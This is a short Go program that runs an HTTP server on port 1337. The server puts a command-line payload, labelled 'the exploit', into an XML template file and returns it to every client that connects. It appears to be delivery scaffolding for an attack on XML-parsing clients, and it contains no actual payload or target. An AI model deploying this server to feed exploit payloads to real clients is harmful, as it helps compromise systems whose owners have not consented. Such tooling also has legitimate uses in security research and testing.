package main

import (
	"bytes"
	"encoding/xml"
	"net/http"
	"os"
	"text/template"
)

// Entry Point
func main() {
	// XML escape the exploit
	exploit := bytes.NewBuffer(nil)
	err := xml.EscapeText(exploit, []byte(os.Args[1]))
	if err != nil {
		panic(err)
	}
	// Parse the template file
	t, err := template.ParseFiles("exploit.xml")
	if err != nil {
		panic(err)
	}
	// Handle all requests by sending the templated xml
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/xml")
		t.Execute(w, map[string]string{
			"Exploit": exploit.String(),
		})
	})
	// Begin listening
	http.ListenAndServe(":1337", nil)
}
